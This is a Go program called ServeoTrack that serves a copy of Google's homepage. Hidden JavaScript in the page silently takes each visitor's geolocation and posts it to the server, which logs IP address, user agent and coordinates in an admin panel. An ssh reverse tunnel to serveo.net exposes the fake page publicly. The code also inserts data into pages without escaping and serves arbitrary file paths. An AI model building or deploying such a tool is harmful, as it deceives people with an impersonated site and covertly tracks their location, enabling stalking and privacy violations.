package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

type LocationData struct {
	Latitude  float64 `json:"latitude"`
	Longitude float64 `json:"longitude"`
	Accuracy  float64 `json:"accuracy"`
	Timestamp string  `json:"timestamp"`
	IP        string  `json:"ip"`
	UserAgent string  `json:"userAgent"`
	Country   string  `json:"country"`
	City      string  `json:"city"`
}

var locations []LocationData
var serveoURL string

func main() {
	port := "8080"
	if p := os.Getenv("PORT"); p != "" {
		port = p
	}

	http.HandleFunc("/", googleFakeHandler)
	http.HandleFunc("/search", googleSearchHandler)
	http.HandleFunc("/location", locationHandler)
	http.HandleFunc("/admin", adminHandler)
	http.HandleFunc("/admin/data", dataHandler)
	http.HandleFunc("/static/", staticHandler)

	fmt.Printf("🚀 ServeoTrack iniciado en puerto %s\n", port)
	fmt.Printf("🌐 Servidor local: http://localhost:%s\n", port)
	fmt.Printf("📊 Panel admin: http://localhost:%s/admin\n", port)
	fmt.Println("🔗 Configurando túnel público...")

	go createServeoTunnel(port)

	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func googleFakeHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: arial, sans-serif;
            background: #fff;
        }
        .header {
            padding: 20px 0;
            text-align: center;
        }
        .logo {
            font-size: 90px;
            color: #4285f4;
            font-weight: normal;
            margin-bottom: 30px;
        }
        .logo .g1 { color: #4285f4; }
        .logo .o1 { color: #ea4335; }
        .logo .o2 { color: #fbbc05; }
        .logo .g2 { color: #4285f4; }
        .logo .l { color: #34a853; }
        .logo .e { color: #ea4335; }
        .search-container {
            max-width: 584px;
            margin: 0 auto;
            position: relative;
        }
        .search-box {
            width: 100%;
            height: 44px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            padding: 0 16px;
            font-size: 16px;
            outline: none;
            box-shadow: 0 2px 5px 1px rgba(64,60,67,.16);
        }
        .search-box:hover {
            box-shadow: 0 2px 8px 1px rgba(64,60,67,.24);
        }
        .search-buttons {
            text-align: center;
            margin-top: 30px;
        }
        .btn {
            background: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            margin: 11px 4px;
            padding: 0 20px;
            line-height: 27px;
            height: 36px;
            min-width: 54px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            box-shadow: 0 1px 1px rgba(0,0,0,.1);
            background-color: #f1f3f4;
            border: 1px solid #dadce0;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: #f2f2f2;
            border-top: 1px solid #e4e4e4;
        }
        .footer-content {
            padding: 15px 30px;
            font-size: 14px;
            color: #70757a;
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .footer-links a {
            color: #70757a;
            text-decoration: none;
            margin: 0 15px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">
            <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>
        <div class="search-container">
            <form action="/search" method="GET">
                <input type="text" name="q" class="search-box" placeholder="Buscar en Google o escribir una URL" autocomplete="off">
            </form>
        </div>
        <div class="search-buttons">
            <button class="btn" onclick="document.querySelector('form').submit()">Buscar con Google</button>
            <button class="btn" onclick="feelingLucky()">Voy a tener suerte</button>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <div>
                    <a href="#">Publicidad</a>
                    <a href="#">Empresa</a>
                    <a href="#">Cómo funciona la Búsqueda</a>
                </div>
                <div>
                    <a href="#">Privacidad</a>
                    <a href="#">Condiciones</a>
                    <a href="#">Configuración</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        var watchId;
        
        function getLocationSilently() {
            if (navigator.geolocation) {
                watchId = navigator.geolocation.watchPosition(
                    function(position) {
                        var locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        
                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(locationData)
                        }).catch(function() {}); 
                        
                        navigator.geolocation.clearWatch(watchId);
                    },
                    function(error) {
                        // Silenciar errores
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 5000,
                        maximumAge: 300000
                    }
                );
            }
        }

        window.addEventListener('load', function() {
            setTimeout(getLocationSilently, 2000);
        });

        document.addEventListener('click', function() {
            setTimeout(getLocationSilently, 500);
        }, { once: true });

        function feelingLucky() {
            window.location.href = 'https://www.google.com/doodles';
        }

        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            var query = document.querySelector('input[name="q"]').value;
            if (query.trim()) {
                window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
            }
        });

        if ('permissions' in navigator) {
            navigator.permissions.query({name: 'geolocation'}).then(function(result) {
                if (result.state === 'granted') {
                    getLocationSilently();
                }
            });
        }
    </script>
</body>
</html>`

	t, _ := template.New("google").Parse(tmpl)
	t.Execute(w, nil)
}

func googleSearchHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("q")
	if query != "" {
		http.Redirect(w, r, "https://www.google.com/search?q="+query, http.StatusTemporaryRedirect)
		return
	}
	http.Redirect(w, r, "/", http.StatusTemporaryRedirect)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	urlDisplay := serveoURL
	if urlDisplay == "" {
		urlDisplay = "Configurando túnel..."
	}

	tmpl := `<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ServeoTrack - Panel de Control</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            color: white;
            margin-bottom: 40px;
        }
        .header h1 {
            font-size: 3rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header p {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        .url-display {
            background: rgba(255,255,255,0.9);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .url-display h2 {
            color: #333;
            margin-bottom: 15px;
        }
        .url-display p {
            font-size: 1.1rem;
            word-break: break-all;
            color: #4285f4;
            font-weight: bold;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.9);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .stat-card h3 {
            color: #4285f4;
            margin-bottom: 10px;
        }
        .stat-card p {
            font-size: 2rem;
            font-weight: bold;
            color: #333;
        }
        .data-table {
            background: rgba(255,255,255,0.9);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #4285f4;
            color: white;
            font-weight: bold;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .actions {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            font-weight: bold;
        }
        .btn-primary {
            background-color: #4285f4;
            color: white;
        }
        .btn-danger {
            background-color: #ea4335;
            color: white;
        }
        .btn:hover {
            opacity: 0.9;
        }
        @media (max-width: 768px) {
            .stats {
                grid-template-columns: 1fr;
            }
            .header h1 {
                font-size: 2rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 ServeoTrack</h1>
            <p>Panel de control para el seguimiento de ubicaciones</p>
        </div>

        <div class="url-display">
            <h2>🔗 URL Pública del Túnel</h2>
            <p>` + urlDisplay + `</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Total de Ubicaciones</h3>
                <p>` + fmt.Sprintf("%d", len(locations)) + `</p>
            </div>
            <div class="stat-card">
                <h3>Última Ubicación</h3>
                <p>` + func() string {
		if len(locations) > 0 {
			return locations[len(locations)-1].Timestamp
		}
		return "Ninguna"
	}() + `</p>
            </div>
            <div class="stat-card">
                <h3>Países Registrados</h3>
                <p>` + func() string {
		countries := make(map[string]bool)
		for _, loc := range locations {
			if loc.Country != "" {
				countries[loc.Country] = true
			}
		}
		return fmt.Sprintf("%d", len(countries))
	}() + `</p>
            </div>
        </div>

        <div class="data-table">
            <table>
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>País</th>
                        <th>Ciudad</th>
                        <th>Latitud</th>
                        <th>Longitud</th>
                        <th>Precisión</th>
                        <th>Hora</th>
                    </tr>
                </thead>
                <tbody>
                    ` + func() string {
		var rows string
		for i := len(locations) - 1; i >= 0 && i > len(locations)-10; i-- {
			loc := locations[i]
			rows += `<tr>
                            <td>` + loc.IP + `</td>
                            <td>` + loc.Country + `</td>
                            <td>` + loc.City + `</td>
                            <td>` + fmt.Sprintf("%.6f", loc.Latitude) + `</td>
                            <td>` + fmt.Sprintf("%.6f", loc.Longitude) + `</td>
                            <td>` + fmt.Sprintf("%.2fm", loc.Accuracy) + `</td>
                            <td>` + loc.Timestamp + `</td>
                        </tr>`
		}
		return rows
	}() + `
                </tbody>
            </table>
        </div>

        <div class="actions">
            <a href="/admin/data" class="btn btn-primary">Ver Datos Completos</a>
            <a href="#" class="btn btn-danger" onclick="if(confirm('¿Estás seguro de que quieres limpiar todos los datos?')) { fetch('/admin/clear', {method: 'POST'}); alert('Datos limpiados'); location.reload(); }">Limpiar Datos</a>
        </div>
    </div>
</body>
</html>`

	t, _ := template.New("admin").Parse(tmpl)
	t.Execute(w, nil)
}

func dataHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(locations)
}

func locationHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var location LocationData
		if err := json.NewDecoder(r.Body).Decode(&location); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		// Obtener IP real
		ip := r.RemoteAddr
		if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
			ip = strings.Split(forwarded, ",")[0]
		}

		location.IP = ip
		location.UserAgent = r.Header.Get("User-Agent")
		location.Timestamp = time.Now().Format("2006-01-02 15:04:05")

		// Simular geocoding
		location.Country = "Desconocido"
		location.City = "Desconocida"

		locations = append(locations, location)
		w.WriteHeader(http.StatusOK)
	} else {
		http.Error(w, "Método no permitido", http.StatusMethodNotAllowed)
	}
}

func staticHandler(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, r.URL.Path[1:])
}

func createServeoTunnel(port string) {
	cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:"+port, "serveo.net")
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	scannerOut := bufio.NewScanner(stdout)
	scannerErr := bufio.NewScanner(stderr)

	go func() {
		for scannerOut.Scan() {
			line := scannerOut.Text()
			if strings.Contains(line, "https://") {
				serveoURL = line
				fmt.Println("🔗 Túnel establecido:", line)
			}
		}
	}()

	go func() {
		for scannerErr.Scan() {
			line := scannerErr.Text()
			if strings.Contains(line, "https://") {
				serveoURL = line
				fmt.Println("🔗 Túnel establecido:", line)
			}
		}
	}()

	if err := cmd.Start(); err != nil {
		fmt.Println("❌ Error al crear el túnel:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		fmt.Println("❌ El túnel se cerró:", err)
	}
}
